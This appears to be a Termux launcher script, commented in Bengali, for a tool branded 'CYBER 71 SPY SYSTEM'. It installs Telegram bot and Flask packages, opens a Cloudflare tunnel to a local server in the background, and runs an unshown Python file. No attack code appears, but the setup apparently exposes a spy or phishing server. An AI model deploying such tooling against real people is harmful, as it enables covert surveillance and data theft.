#!/bin/bash

# স্ক্রিন পরিষ্কার করা
clear

# ব্যানার প্রদর্শন
echo -e "\e[1;32m"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "      CYBER 71 SPY SYSTEM - OWNER: ENAFUL   "
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "\e[0m"

# প্রয়োজনীয় প্যাকেজ চেক করা
echo -e "\e[1;34m[*] Checking System Requirements...\e[0m"
pkg update -y && pkg upgrade -y
pkg install python -y
pip install python-telegram-bot flask requests cloudflared

# টার্মাক্সকে ব্যাকগ্রাউন্ডে সচল রাখা
termux-wake-lock

# Cloudflare Tunnel ব্যাকগ্রাউন্ডে চালু করা
echo -e "\e[1;34m[*] Starting Cloudflare Tunnel...\e[0m"
nohup cloudflared tunnel --url http://127.0.0.1:5000 > /dev/null 2>&1 &

sleep 5

# আপনার নতুন পাইথন ফাইলটি রান করা
echo -e "\e[1;32m[+] ENAFUL_69.py is launching...\e[0m"
python ENAFUL_69.py

